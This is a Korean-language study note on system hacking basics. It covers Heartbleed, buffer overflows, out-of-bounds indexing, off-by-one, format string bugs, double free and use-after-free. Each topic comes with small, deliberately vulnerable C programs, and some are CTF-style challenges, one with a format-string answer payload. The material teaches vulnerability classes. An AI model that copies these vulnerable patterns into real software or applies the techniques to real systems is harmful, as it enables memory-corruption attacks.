# System hacking

## 해킹이란?

소프트웨어 취약점은 공격자가 주어진 권한 이상의 권한을 획득하거나 프로그래머가 의도하지 않은 동작을 수행할 수 있도록 하는 소프트웨어 버그를 의미.

공격자는 소프트웨어 취약점을 찾아 원하는 것을 달성하려 하고, 보안 전문가들은 취약점을 패치해 프로그램을 보호한다.

하트블리드 취약점은 2014년에 OpenSSL에서 발생했던 취약점으로, 개발자의 잘못된 가정이 얼마나 위험한 결과를 불러올 수 있는지 나타내는 예시다. 이는 OpenSSL의 확장 규격 중 하나인 HeartBeat에서 발생한 취약점으로, 클라이언트에게 전송받은 데이터의 유효성을 검증하지 않아 발생한 정보 탈취 취약점이다.

안정적인 통신 유지를 위해 클라이언트는 HeartBeat 프로토콜을 이용해 임의의 정보를 그 정보의 길이와 함께 서버에 전송하고 서버는 클라이언트에게 전달받은 정보를 그대로 반환해 연결을 확인한다. 그러나 이때 실제 데이터의 길이와 클라이언트가 명시한 데이터의 길이가 서로 다른 경우 문제가 발생한다. 가령 클라이언트가 "theori"라는 데이터와 "6"이라는 데이터 길이를 전송한다면 서버는 정상적으로 "theori"라는 데이터를 반환할 것이다. 만약 클라이언트가 "theori"라는 데이터와 "3000"이라는 데이터 길이를 전송한다면 서버는 문제점을 감지하고 이를 처리해야 한다. 그러나 이 경우 데이터의 길이를 전혀 검증하지 않아 "theori"라는 데이터가 저장된 메모리부터 3,000 바이트를 읽어 클라이언트에게 보내주는 것이다.
공격자는 이를 이용해 시스템 메모리에 저장된 민감한 데이터를 유출할 수 있었고, 해당 취약점은 큰 이슈가 되었다.

## 취약점이란?

익스플로잇이란 사전적으로 악용이란 뜻으로, 취약점을 이용해 공격자가 의도한 동작을 수행하게 하는 코드, 또는 이를 이용한 공격행위를 의미.

소프트웨어 버그는 보안에 영향을 미치는 정도에 따라 크게 4가지로 분류 가능. 

버그/취약점의 분류를 나타내는 다이어그램.
Buggy>Vulnerable>Exploitable>Reliably Exploitable

먼저 프로그래머가 의도하지 않은 동작을 수행하는 소프트웨어 버그(Bug)가 가장 상위에 있다. 그러한 소프트웨어 버그 중 보안에 영향을 미칠 수 있는 버그를 소프트웨어 취약점(Vulnerability)이라 하고, 소프트웨어 취약점 중 이를 이용해 공격자가 의도한 동작을 수행할 수 있는 버그를 익스플로잇 가능한 취약점(Exploitable Vulnerability)이라고 한다. 그러나 익스플로잇이 가능하다고 해서 익스플로잇을 항상 안정적으로 성공할 수 있는 것은 아니다. 보안 취약점에서 익스플로잇 확률은 위험성을 평가하는 중요한 요소 중 하나인데, 이는 익스플로잇 확률이 높을수록 무기화되어 사용하기 유용하고, 공격이 탐지될 확률이 줄어들기 때문이다. 이렇게 익스플로잇이 가능한 취약점 중 매우 높은 확률로 공격에 성공할 수 있는 버그를 안정적으로 익스플로잇 가능한 취약점(Reliably Exploitable Vulnerability)이라고 한다.



## Attack Vector

모든 소프트웨어 취약점은 소프트웨어와 공격자가 상호 작용하는 곳, 즉 사용자의 입력에서부터 발생한다. 이렇게 공격자가 소프트웨어와 상호 작용할 수 있는 곳을 Attack Vector(공격 벡터)라고 하며, 이러한 Attack Vector들의 집합을 Attack Surface라고 한다.

프로그램의 unreachable code 영역에 심각한 보안 취약점이 있다고 가정해 보자. 만약 해당 코드가 어디에서도 사용되지 않고 공격자가 이를 실행할 방법이 없다면 이는 보안 취약점이라고 할 수는 없다. 그러나 이러한 코드도 잠재적으로 악용될 수 있는 코드이기 때문에 존재해서는 안 된다.
따라서 프로그래머는 사용자에게서 입력받는 부분을 철저히 검증해야 함.


## 취약점의 종류- 메모리 커럽션 취약점

취약점은 공격 방법에 따라 크게 두 가지로 나눌 수 있다. 

C/C++과 같은 저수준 언어에서 메모리를 조작해 공격하는 메모리 커럽션 취약점과 메모리를 조작할 필요 없이 공격할 수 있는 로지컬 취약점이다. 

메모리 커럽션 취약점은 다음과 같다.

* **Buffer Overflow**
Buffer Overflow(BOF)는 메모리 커럽션 취약점 중 가장 대표적인 취약점이다. 이는 프로그래머가 할당한 크기의 버퍼보다 더 큰 데이터를 입력받아 메모리의 다른 영역을 오염시킬 수 있는 취약점이다. 버퍼 오버플로우는 발표된 지 30년에 가까운 시간이 흘렀지만, 아직도 공격에 자주 사용되는 취약점이다.

* **Out-Of-Boundary**
Out-Of-Boundary(OOB) 취약점은 버퍼의 길이 범위를 벗어나는 곳의 데이터에 접근할 수 있는 취약점이다. 이 또한 버퍼 오버플로우와 마찬가지로 매우 강력한 취약점으로, 브라우저와 같은 대규모 최신 소프트웨어에서도 자주 발견되는 취약점이다.

* **Off-by-one**
Off-by-one은 경계 검사에서 하나 더 많은 값을 쓸 수 있을 때 발생하는 취약점이다. 가령 32바이트 크기의 버퍼에 인덱스 32로 접근하는 것 같은 경우다. 이는 반복문을 순회할 때 잘못된 비교 연산자를 사용하거나 인덱스가 0부터 시작하는 것을 고려하지 못했을 때 자주 발생하는 취약점이다.

* **Format String Bug**
Format String Bug(FSB)는 printf나 sprintf와 같은 함수에서 포맷 스트링 문자열을 올바르게 사용하지 못해 발생하는 취약점. 포맷 스트링 역시 매우 강력한 취약점이지만, 최신 컴파일러에서는 여러 가지 방법으로 이를 방어하고 있어 최근에는 잘 발생하지 않고 있다.

* **Double Free / Use-After-Free**
Double Free와 Use-After-Free(UAF) 취약점은 동적 할당된 메모리를 정확히 관리하지 못했을 때 발생하는 취약점. 이미 해제된 메모리를 다시 한번 해제하려고 시도하는 것을 Double Free, 해제된 메모리에 접근해 이를 사용하려고 하는 것을 Use-After-Free라고 한다.

## 취약점 종류- 로지컬 버그

로지컬 버그는 메모리 커럽션 취약점과는 달리 프로그램의 메모리 구조를 이용해 공격할 필요가 없습니다. 따라서 익스플로잇 작성이 메모리 커럽션 취약점보다는 상대적으로 간단합니다.

* **Command Injection**
Command Injection은 사용자의 입력을 셸에 전달해 실행할 때 정확한 검사를 실행하지 않아 발생하는 취약점입니다. 이는 공격자가 원하는 명령을 실행할 수 있는 데 비해 익스플로잇이 어렵지 않아 매우 강력한 취약점입니다.

* **Race Condition**
보안 취약점으로서의 Race Condition은 여러 스레드나 프로세스의 자원 관리를 정확히 수행하지 못해 데이터가 오염되는 취약점입니다. 레이스 컨디션은 발생 원인과 공격 방법에 따라 메모리 커럽션 취약점으로도, 로지컬 취약점으로도 분류할 수 있는 취약점입니다.

* **Path Traversal**
Path Traversal은 프로그래머가 가정한 디렉토리를 벗어나 외부에 존재하는 파일에 접근할 수 있는 취약점입니다. 이는 주로 소스 코드에서 "../"와 같은 경로 문자를 검사하지 않아 발생합니다.

## 보호기법

컴퓨터 과학자들은 기본적으로 취약점은 존재한다는 전제하에 시스템을 보호하는 방법을 고민했고, 그래서 등장한게 보호기법(Mitigation).

보호기법은 취약점을 통한 공격을 어렵게 만든다. 예를 들어, 스택 버퍼 오버플로우에 대한 보호기법 중 하나인 Stack Smashing Protector(SSP)는 버퍼의 뒤에 랜덤한 값을 넣어두고, 이 값을 특정 시점에 검사하여 버퍼 오버플로우가 발생했는지 탐지합니다. 그리고 만약 공격이 발생했다면 프로그램을 강제로 종료시킵니다. 이로 인해 공격자는 프로그램에서 버퍼 오버플로우 취약점을 발견해도 공격에 이용하기가 어려워졌다.

그러나 해커들 역시 보호기법을 우회하기 위해 여러 새로운 공격기법들을 고안하였다. 이렇게 새로 등장한 공격기법을 막기 위해 또 새로운 보호기법이 생기고, 이를 우회하기 위한 또 다른 공격기법들이 만들어지게 된다. 공격기법과 보호기법의 공방은 처음 스택 버퍼 오버플로우를 공격하는 문서가 발표된 이후 지금까지 꾸준히 계속되고 있다.


# 1. 버퍼 오버플로우

가장 먼저 살펴볼 취약점은 버퍼 오버플로우 취약점이다.
C언어에서 버퍼란 지정된 크기의 메모리 공간이다.
버퍼 오버플로우 취약점은 그 이름에서 나타나듯이 버퍼가 허용할 수 있는 양의 데이터보다 더 많은 값이 저장돼 버퍼가 넘치는 취약점이다.

일반적으로 버퍼 오버플로우는 발생하는 위치에 따라 스택 버퍼 오버플로우, 힙 오버플로우와 같이 나눠서 부른다. 

버퍼 오버플로우는 인접한 메모리를 오염시키는 취약점이기 때문에 어떤 메모리를 오염시킬 수 있는지에 따라 공격 방법이 달라진다.
그중 스택 버퍼 오버플로우는 가장 초기에 연구됐던 형태의 버퍼 오버플로우로, 지역 변수가 할당되는 스택 메모리에서 오버플로우가 발생하는 경우다.

먼저 8바이트의 버퍼 A와 8바이트 데이터 버퍼 B가 메모리에 선형적으로 할당되었다고 생각해 보자. 여기서 버퍼 A에 16 바이트의 데이터를 복사한다면 이 데이터의 뒷부분은 버퍼 A를 넘어 뒤에 있는 데이터 영역인 B에 쓰여지게 된다.

이때 우리는 버퍼 오버플로우가 발생했다고 하고, 이는 프로그램의 Undefined Behavior을 이끌어낸다. 만약 데이터 영역 B에 나중에 호출될 함수 포인터를 저장하고 있다면 이 값을 "AAAAAAAA"와 같은 데이터로 덮었을 때 Segmantation Fault를 발생시킬 것이다. 만약 공격자가 이를 악용한다면 어딘가에 기계어 코드를 삽입한 후 함수 포인터를 공격자의 코드의 주소로 덮어 코드를 실행할 수도 있다.

## 스택 버퍼 오버플로우

```
// stack-1.c
#include <stdio.h>
#include <stdlib.h>
int main(void) {
    char buf[16];
    gets(buf);
    
    printf("%s", buf);
}
```


stack-1.c는 16 바이트 버퍼 buf를 스택에 할당한 후, gets 함수를 통해 사용자로부터 데이터를 입력받아 이를 그대로 출력하는 코드다. gets함수는 사용자가 개행을 입력하기 전까지 입력했던 모든 내용을 첫 번째 인자로 전달된 버퍼에 저장하는 함수다. 그러나 gets 함수에는 별도의 길이 제한이 없기 때문에 16 바이트가 넘는 데이터를 입력한다면 스택 버퍼 오버플로우가 발생한다.

이처럼 버퍼 오버플로우 취약점은 프로그래머가 버퍼의 길이에 대한 가정을 올바르지 않게 하여 발생한다. 이는 보통 길이 제한이 없는 API 함수들을 사용하거나 버퍼의 크기보다 입력받는 데이터의 길이가 더 크게 될 때 자주 일어나는 실수다.


```
// stack-2.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int check_auth(char *password) {
    int auth = 0;
    char temp[16];
    
    strncpy(temp, password, strlen(password));
    
    if(!strcmp(temp, "SECRET_PASSWORD"))
        auth = 1;
    
    return auth;
}
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: ./stack-1 ADMIN_PASSWORD\n");
        exit(-1);
    }
    
    if (check_auth(argv[1]))
        printf("Hello Admin!\n");
    else
        printf("Access Denied!\n");
}
```
stack-2.c의 main 함수는 argv[1]을 check 함수의 인자로 전달한 후 그 리턴 값을 받아옵니다. 리턴 값이 0이 아니라면 "Hello Admin!"을, 0이라면 "Access Denied!"라는 문자열을 출력한다.

핵심이 되는 check 함수에서는 16 바이트 크기의 temp 버퍼에 입력받은 패스워드를 복사한 후 "SECRET_PASSWORD" 문자열과 비교한다. 문자열이 같다면auth 변수를 1로 설정하고 auth를 리턴한다.

그러나 line 10에서 strncpy 함수를 통해 temp 버퍼를 복사할 때, temp의 크기인 16 바이트가 아닌 인자로 전달된 password 문자열의 길이만큼을 복사한다. 따라서 argv[1]에 16 바이트가 넘는 문자열을 전달한다면 길이 제한 없이 문자열이 복사되어 스택 버퍼 오버플로우가 발생하게 된다.

temp 버퍼 뒤에 auth 값이 존재하므로, 오버플로우가 발생해 공격자의 데이터가 auth 값을 바꾼다면 auth가 0이 아닌 다른 값이 될 수 있다. 이 경우 실제 인증 여부와는 상관없이 line 24의 if(check_auth(argv[1])) 문은 항상 참을 반환하게 된다.

```
// stack-3.c
#include <stdio.h>
#include <unistd.h>
int main(void) {
    char win[4];
    int size;
    char buf[24];
    
    scanf("%d", &size);
    read(0, buf, size);
    if (!strncmp(win, "ABCD", 4)){
        printf("Theori{-----------redacted---------}");
    }
}
```

stack-3.c의 main함수는 24 바이트 크기의 버퍼 buf를 할당한다. scanf 함수를 통해 size 변수에 값을 입력받고, size만큼 buf에 데이터를 입력받는다.


![](https://i.imgur.com/jiSoFKH.png)





`
// stack-4.c
#include <stdio.h>
int main(void) {
	char buf[32] = {0, };
	read(0, buf, 31);
	sprintf(buf, "Your Input is: %s\n", buf);
	puts(buf);
}
`
stack-4.c는 32바이트 크기 buf를 초기화한 후 데이터를 31바이트 입력받고, sprintf 함수를 통해 출력할 문자열을 저장한 뒤 출력하는 코드다.

read 함수에서 받는 입력이 32바이트를 넘진 않지만, sprintf 함수를 통해 버퍼에 값을 쓸 때 "Your Input is: "문자열을 추가한다는 사실을 생각해야 한다. 만약 buf에 31바이트를 꽉 채운다면 "Your Input is: " 문자열이 앞에 붙어 총 길이가 32바이트를 넘게 된다.


지금까지 살펴본 바와 같이 버퍼 오버플로우는 프로그래머가 길이에 대한 검증을 정확히 수행하지 못해 발생한다. 만약 공격 벡터로부터 데이터를 입력받고 이를 버퍼에 저장하는 코드가 있다면 이를 유심히 살펴볼 필요가 있다. 데이터를 버퍼에 입력받을 때는 입력받은 데이터가 버퍼의 범위를 초과하지 않는지 항상 정확히 검사해야 한다.

입력받을 때 길이 제한이 없는 함수를 사용한다면 이는 잠재적으로 취약하다고 볼 수 있다. 입력받은 데이터가 버퍼에 저장되기까지의 흐름을 따라가 버퍼의 크기를 넘는 양을 저장할 수 있는지 가능성을 검토해야 한다. 만약 길이를 명시하는 함수를 사용한다면, 명시된 길이가 버퍼의 크기를 넘을 수 있는지를 검토해야 한다.

버퍼 오버플로우는 스택에서만 발생하는 취약점이 아니다. 프로그래머가 동적으로 메모리를 관리할 수 있는 힙에서도 똑같이 발생할 수 있다. 이들은 단지 발생하는 메모리 영역의 차이만 있을 뿐이고 취약점이 발생하는 원인이 본질적으로 다르진 않다.

힙 영역은 스택 영역과 사용 목적이 다르기 때문에, 스택 버퍼 오버플로우와는 다른 방법으로 익스플로잇해야 한다. 힙 오버플로우를 익스플로잇하는 방법은 Linux Exploitation & Mitigation 강의에서 다룬다. 여기서는 힙 오버플로우가 어떻게 발생하는지에 대해서만 간단히 알아보도록 하겠다.


## 힙 오버플로우

```
// heap-1.c
#include <stdio.h>
#include <stdlib.h>
int main(void) {
    char *input = malloc(40);
    char *hello = malloc(40);
    
    memset(input, 0, 40);
    memset(hello, 0, 40);
    
    strcpy(hello, "HI!");
    read(0, input, 100);
    
    printf("Input: %s\n", input);
    printf("hello: %s\n", hello);
}
```

heap-1.c는 40바이트 크기의 힙 버퍼 input과 hello를 할당한 후, hello 버퍼에는 "HI!" 문자열을 복사하고 read 함수를 통해 input에 데이터를 입력받는 코드이다. 그러나 read 함수를 통해 입력받는 길이인 100바이트가 input 버퍼의 크기인 40바이트보다 크기 때문에 힙 오버플로우가 발생한다.


힙 오버플로우가 발생했을 때의 힙 메모리 상태는 아래의 그림으로 간략히 나타낼 수 있다.

![](https://i.imgur.com/6VXSEtA.png)

input 영역에서 버퍼 오버플로우가 발생해 hello의 메모리 영역까지 침범할 경우, line 16에서 hello 메모리를 출력할 때 "HI!" 문자열이 아니라 공격자에게 오염된 데이터가 출력된다.


# 2. Out-of-boundary (OOB)

```
// oob-1.c
#include <stdio.h>
int main(void) {
    int win;
    int idx;
    int buf[10];
    
    printf("Which index? ");
    scanf("%d", &idx);
    printf("Value: ");
    scanf("%d", &buf[idx]);
    printf("idx: %d, value: %d\n", idx, buf[idx]);
    if(win == 31337){
        printf("Theori{-----------redacted---------}");
    }
}
```
OOB(Out Of Boundary)는 버퍼의 길이 범위를 벗어나는 인덱스에 접근할 때 발생하는 취약점이다.

oob1.c에서는 int형 배열 buf를 선언하고 idx 값을 입력 받는다. 그다음 buf[idx]에 정수를 입력받고 idx와 buf[idx] 값을 출력한다.

여기서 주의해야 할 점은 buf의 길이는 10이므로 buf의 인덱스로 사용될 수 있는 올바른 값은 0 이상 10 미만의 정수라는 사실이다. 그러나 코드에서는 line 10에서 입력받은 idx 값을 인덱스로 사용할 때 해당 값이 올바른 범위에 속해 있는지 검사하지 않는다. C언어는 인덱스를 이용해 버퍼에 접근할 때 인덱스의 범위에 대한 별도의 경계 검사가 존재하지 않기 때문에 올바르지 않은 값을 사용한다면 buf의 영역 밖에 있는 값에 접근할 수 있다.

그렇다면 idx와 buf[idx]에 적당한 값을 줘서 win 변수를 31337로 만들어보자.

![](https://i.imgur.com/zqrUmcv.png)
![](https://i.imgur.com/qiBpHq7.png)



```
// oob-2.c
#include <stdio.h>
int main(void) {
    int idx;
    int buf[10];
    int win;
    
    printf("Which index? ");
    scanf("%d", &idx);
    
    idx = idx % 10;
    printf("Value: ");
    scanf("%d", &buf[idx]);
    printf("idx: %d, value: %d\n", idx, buf[idx]);
    if(win == 31337){
        printf("Theori{-----------redacted---------}");
    }
}
```

oob-2.c는 oob-1.c와는 달리 line 12에 idx = idx % 10이라는 코드가 추가되었다. 이 코드로 OOB 취약점을 막을 수 있을까?

OOB의 발생 여부를 판단할 때는 버퍼의 인덱스로 사용할 수 있는 올바른 값의 범위와 버퍼의 인덱스가 될 수 있는 모든 값의 범위를 비교하면 된다. 인덱스가 될 수 있는 값의 범위가 사용할 수 있는 올바른 값의 범위의 부분집합이라면 안전하다고 할 수 있을 것이다. 그렇다면 oob2.c에 이를 적용해 보겠다.

* buf의 인덱스로 써야 하는 값의 범위: 0~9

* buf의 인덱스로 쓸 수 있는 값의 범위: int 형의 범위 % 10

양의 정수를 10으로 나눈 나머지로 가능한 값은 0에서 9까지기 때문에 이는 얼핏 보면 안전해 보입니다. 그러나 C언어에서는 피연산자가 음수라면 나머지 연산의 결과도 음수가 될 수 있다. 따라서 이 경우, buf의 인덱스로 쓸 수 있는 값의 범위는 -9 ~ 9이므로 나머지가 음수가 되게 한다면 OOB를 발생시킬 수 있다.

![](https://i.imgur.com/TkIKIld.png)
![](https://i.imgur.com/ZP08YGW.png)

```
//oob-3.c
#include <stdio.h>
int main(void) {
    int idx;
    int buf[10];
    int dummy[7];
    int win;
    printf("Which index? ");
    scanf("%d", &idx);
    
    if(idx < 0)
        idx = -idx;
    idx = idx % 10; // No more OOB!@!#!
    printf("Value: ");
    scanf("%d", &buf[idx]);
    printf("idx: %d, value: %d\n", idx, buf[idx]);
    if(win == 31337){
        printf("Theori{-----------redacted---------}");
    }
}
```

oob-3.c는 oob-2.c와는 다르게 idx가 음수일 경우 이를 양수로 바꿔주는 코드가 추가되었다. line 14에 들어가게 되는 idx 값은 양수가 되고, 10으로 나머지 연산을 했을 때 값의 범위는 0부터 9까지기 때문에 아무 문제가 없어 보인다.

그러나 C언어의 정수 표현에 대해 생각해보면, 뭔가 이상한 부분이 있다는 걸 알 수 있다. 몇 가지 idx 값에 따라 line 14가 어떻게 실행되는지 자세히 살펴보겠다.

* idx = 1 (line 14) -> idx = 1 (line 15)

* idx = -100 (line 14) -> idx = 100 (line 15)

* idx = -10000 (line 14) -> idx = 10000 (line 15)

* idx = -pow(2, 31) (line 14) -> idx = -pow(2, 31) (line 15)

마지막으로 나타나 있는 예제가 직관적으로 이해되지 않을 수 있다. 


![](https://i.imgur.com/FNSwSFe.png)

![](https://i.imgur.com/NVUbrPs.png)

C언어에서 int형으로 표현 가능한 정수의 범위는 -pow(2, 31) ~ pow(2, 31) - 1 이다. int형은 32비트이기 때문에 총 pow(2, 32)개의 수를 표현할 수 있다. int형은 0을 포함하기 때문에 표현할 수 있는 음의 정수의 갯수와 양의 정수의 갯수는 다르다.

int 형에서 -pow(2,31)은 표현 가능하지만 pow(2,31)은 표현 가능하지 않다. pow(2,31)은 표현 가능한 최대 정수보다 하나 더 크기 때문에 이는 -pow(2,31)과 같은 값이 된다.

oob-3.c를 다시 살펴보겠다. 지금까지 논의한 바에 따르면, idx에 -pow(2, 31)을 넣었을 경우 line 14에서 절대값을 구하는 연산을 수행한 후에도 -2^31이 그대로 저장된다. 그렇다면 line 15에서 idx = idx % 10을 할 때 idx에 음수가 저장되고, 이는 buf 배열의 올바른 인덱스 범위를 벗어나기 때문에 OOB가 발생한다.

이를 근본적으로 막기 위해서는 idx를 int형이 아닌 unsigned int형으로 선언하거나, 인덱스를 입력받은 이후에 if(idx < 0 || idx >= 10)과 같은 경계 검사 구문을 추가해야 한다.



# 3. Off-by-one

```
#include <stdio.h>
void copy_buf(char *buf, int sz) {
    char temp[16];
    
    for(i = 0; i <= sz; i++)
        temp[i] = buf[i];
}
int main(void) {
    char buf[16];
    
    read(0, buf, 16);
    copy_buf(buf, sizeof(buf));
}
```

Off-by-one 취약점은 경계 검사에서 하나의 오차가 있을 때 발생하는 취약점이다. 이는 버퍼의 경계 계산 혹은 반복문의 횟수 계산 시 < 대신 <=을 쓰거나, 0부터 시작하는 인덱스를 고려하지 못할 때 발생한다.

off-by-one-1.c는 buf에 16바이트 문자열을 입력받은 후 buf와 sizeof(buf)의 값을 copy_buf 함수의 인자로 전달한다. copy_buf함수에서는 임시 버퍼 temp를 할당하고 반복문을 통해 buf의 데이터를 복사한다. 그러나 반복문은 i가 0일 때부터 sz일 때까지 총 sz + 1번 반복하게 된다. 따라서 sz + 1만큼 데이터가 복사되고, off-by-one 취약점이 발생한다.


1. 스택 버퍼 오버플로우
스택 버퍼 오버플로우는 가장 초기에 등장한 버퍼 오버플로우 형태 중 하나로, 지역 변수가 할당되는 스택 메모리에서 발생하는 취약점이다. 이는 데이터를 입력받거나 복사하는 부분에 대한 길이 검증이 존재하지 않거나 미흡할 경우에 발생한다.

2. 힙 오버플로우
힙 버퍼 오버플로우는 동적으로 할당된 힙 메모리 영역에서 발생하는 취약점이다. 이는 데이터를 입력받거나 복사하는 부분에 대한 길이 검증이 존재하지 않거나 미흡할 경우에 발생한다.


3. Out-Of-Boundary
Out-Of-Boundary는 버퍼의 길이 범위를 벗어나는 인덱스에 접근할 때 발생하는 취약점이다. 이는 올바르지 않은 값이 버퍼의 인덱스로 사용될 경우 발생한다.

4. Off-by-one
Off-by-one은 버퍼의 경계 계산 혹은 잘못된 반복문의 연산자를 사용하는 등의 인덱스를 고려하지 않을 때 발생하는 취약점이다.




# 1. Format String Bug

포맷 스트링 버그는 printf나 sprintf와 같이 포맷 스트링을 사용하는 함수에서 발생하는 취약점으로, "%x"나 "%s"와 같이 프로그래머가 지정한 문자열이 아닌 사용자의 입력이 포맷 스트링으로 전달될 때 발생하는 취약점입니다.
```
// fsb-1.c
#include <stdio.h>
int main(void) {
    char buf[100] = {0, };
    
    read(0, buf, 100);
    printf(buf);
}

```


printf(buf);와 같이 사용자의 입력이 printf 함수의 인자로 그대로 전달될 때를 생각해 보겠다. "asdf"와 같은 일반적인 문자열이 전달된다면 입력한 문자열이 그대로 출력될 것이다. 그러나 "%x"와 "%s"와 같은 포맷 스트링이 들어간다면 이는 인자를 전달하지 않고 포맷 스트링을 전달한 것과 같은 효과가 된다. 포맷 스트링 버그는 이처럼 검증되지 않은 사용자의 입력이 포맷 스트링으로 취급되어 프로그래머가 의도하지 않은 동작을 수행하는 버그이다.

fsb-1.c는 char형 배열 buf에 100 바이트를 입력받고 printf 함수를 통해 입력받은 버퍼를 출력하는 간단한 예제이다.

만약 "asdf"나 "10"과 같은 일반적인 문자열을 입력한다면 printf 문은 printf("asdf"); 혹은 printf("10"); 과 같이 된다. 이 경우에는 정상적으로 문자열이 출력된다.

그러나 "%x %d"와 같은 포맷 스트링을 문자열로 입력한다면, printf(buf)는 printf("%x %d")가 된다. printf("%x %d")에는 두 번째 인자와 세 번째 인자가 전달되지 않기 때문에 쓰레기 값을 인자로 취급해 출력한다.

```
// fsb-2.c
#include <stdio.h>
#include <stdlib.h>
int main(void) {
    FILE *fp = fopen("log.txt", "w");
    char buf[100] = {0, };
    
    read(0, buf, 100-1);
    
    fprintf(fp, "BUFFER-LOG: ");
    fprintf(fp, buf);
    
    fclose(fp);
    return 0;
}
```





fsb-2.c는 fprintf 함수에서 포맷 스트링 버그가 발생하는 코드입니다. fprintf 함수의 두 번째 인자는 포맷 스트링이어야 한다. 그러나 fsb-2.c 의 line 12에서는 포맷 스트링이 위치할 곳에 사용자의 버퍼가 위치하므로 포맷 스트링 버그가 발생하게 된다.

이번에도 fsb-1.c 와 마찬가지로 "%x"나 "%d"와 같은 포맷 스트링을 입력하면 의도치 않은 값이 파일에 저장된다.




포맷 스트링 버그는 포맷 스트링을 사용하는 함수의 인자만 잘 검토하면 되기 때문에 다른 취약점들에 비해 막기 쉽다. 특히 최신 컴파일러에서는 포맷 스트링으로 전달되는 인자가 문자열 리터럴이 아닐 경우 경고 메시지를 출력하기 때문에 요즘에는 잘 발생하지 않는 취약점이다.

그러나 포맷 스트링 버그는 프로그램에 큰 영향을 줄 수 있는 취약점이기 때문에 항상 염두해 두어야 한다. 표준 C 라이브러리에서 포맷 스트링을 사용하는 대표적인 함수들은 아래와 같다.

printf

sprintf / snprintf

fprintf

vprintf / vfprintf

vsprintf / vsnprintf

위와 같이 포맷 스트링을 인자로 받는 함수들을 사용할 때에는 혹시 검증되지 않은 입력이 포맷 스트링으로 전달되지는 않을지 주의해야 한다.

```
// fsb-easy.c
#include <stdio.h>
int main(void) {
    int flag = 0x41414141;
    char buf[32] = {0, };
    
    read(0, buf, 31);
    printf(buf);
}
```
```
정답 : 
%x %x %x %x %x %x %x %x %x %x
```

![](https://i.imgur.com/HeBmpCn.png)





# 2. Double free & Use after free

C언어는 프로그래머가 수동으로 동적 메모리를 관리해야 하는 언어다. 메모리를 정확히 관리하지 못 해 해제된 메모리에 접근하거나, 메모리를 할당하고 해제하지 않아 메모리 릭이 발생할 경우 이는 큰 문제로 이어질 수 있다. 이번 장에서는 올바르지 않은 동적 메모리 관리로 인해 발생하는 취약점을 알아보도록 하겠겠다..


* Double free
동적 메모리 관리에서 가장 자주 발생하는 문제는 해제된 메모리를 정확히 관리하지 않아 발생하는 문제다. 특히 Double Free 취약점은 이미 해제된 메모리를 다시 한 번 해제하는 취약점. 또, Use-After-Free(UAF) 취약점은 해제된 메모리에 접근해서 값을 쓸 수 있는 취약점이다.

```
// df-1.c
#include <stdio.h>
#include <malloc.h>
int main(void) {
    char* a = (char *)malloc(100);
    char *b = (char *)malloc(100);
    memset(a, 0, 100);
    strcpy(a, "Hello World!");
    
    memset(b, 0, 100);
    strcpy(b, "Hello Pwnable!");
    
    printf("%s\n", a);
    printf("%s\n", b);
    
    free(a);
    free(b);
    
    free(a);
}
```




df-1.c 는 메모리를 할당하고 할당된 메모리에 Hello World! 문자열을 복사한 뒤 이를 출력하는 코드다. 그러나 line 21에서 해제하는 메모리 a는 line 18에서 이미 해제된 메모리 포인터다.

그러나 이 프로그램을 Ubuntu 18.04 환경에서 실행해보면 정상적으로 종료된다는 것을 알 수 있다. 따라서 line 18에서 이미 free된 메모리 a에 대해 다시 free를 호출하는 일이 어떤 일을 발생시키는지는 정확히 모르지만, 해제된 메모리를 다시 해제하는 것이 불가능하지 않다는 사실을 알 수 있다.

line 6에서 메모리를 할당했을 때 a가 저장하고 있는 값은 특정 힙 메모리의 주소다. 그러므로 a를 free했을 때 시스템에 해당하는 힙 메모리 할당자의 구현에 따라 메모리가 해제된다. 그러나 이 때 같은 포인터를 두 번 해제하는 것과 같은 비정상적인 일이 발생하면 공격자가 프로그램을 예상치 못한 실행 흐름으로 만들 수 있다.

Double Free 취약점을 공격하는 방법에 대해서는 Heap Allocator Exploitation 코스에서 자세히 다룬다.



* Use-After-Free

```
// uaf1.c
#include <stdio.h>
#include <string.h>
#include <malloc.h>
int main(void) {
    char *a = (char *)malloc(100);
    memset(a, 0, 100);
    
    strcpy(a, "Hello World!");
    printf("%s\n", a);
    free(a);
    
    char *b = (char *)malloc(100); 
    strcpy(b, "Hello Pwnable!");
    printf("%s\n", b);
    
    strcpy(a, "Hello World!");
    printf("%s\n", b);
}
```

```
# gcc -o uaf1 uaf1.c
# ./mem
Hello World!
Hello Pwnable!
Hello World!
# 
```

uaf1.c는 100 바이트 크기의 메모리 a 를 할당한 후 "Hello World!" 문자열을 복사한다. 현재 힙 메모리 상태는 아래와 같다.
![](https://i.imgur.com/nqqyAHO.png)



그 다음 메모리 a를 해제하고 새로운 100 바이트 크기의 메모리 b 를 할당한다. 새로 할당된 메모리에는 strcpy 함수를 통해 메모리 b 에 "Hello Pwnable!" 문자열을 복사한다. 현재의 힙 메모리 상태는 아래와 같다. **여기서 주의할 점은, 포인터 a에 저장된 메모리 주소 값은 바뀌지 않았다는 것과 메모리 a와 메모리 b가 같은 주소를 가리키고 있다는 점.** 이는 이미 해제되었던 메모리 a가 메모리 할당자로 들어가고, 새로운 메모리 영역을 할당할 때 메모리를 효율적으로 관리하기 위해 기존에 해제되었던 메모리가 그대로 반환되어 일어나는 일.

![](https://i.imgur.com/ujK6qzy.png)


그러므로 이미 해제된 메모리 a에 접근하면 메모리 b가 같이 영향을 받기 때문에 프로그래머가 의도하지 않은 일이 발생할 수 있다. line 18에서 "Hello World!" 문자열을 복사하는 포인터는 b 가 아닌, 해제된 메모리 포인터인 a . 따라서 현재의 힙 메모리 상태는 아래와 같다.
![](https://i.imgur.com/avka9bf.png)


이미 해제된 포인터 a와 새로이 할당한 포인터 b가 같은 메모리 영역을 가리키고 있기 때문에, 포인터 a에 "Hello World!" 문자열을 복사하고 포인터 b의 내용을 출력하면 "Hello World!" 문자열이 출력된다.

메모리 할당자는 환경에 따라 다르지만, 일반적으로는 효율성을 위해 이미 해제된 메모리를 재사용하게 된다. 이 때 해제된 메모리 포인터에 데이터를 쓴다면, 이미 다른 곳에서 사용되고 있는 메모리에 데이터가 작성될 수 있다. 이와 같이 이미 해제된 메모리를 다시 사용해 의도하지 않은 동작을 발생시키는 취약점을 Use-After-Free(UAF) 취약점이라고 한다.

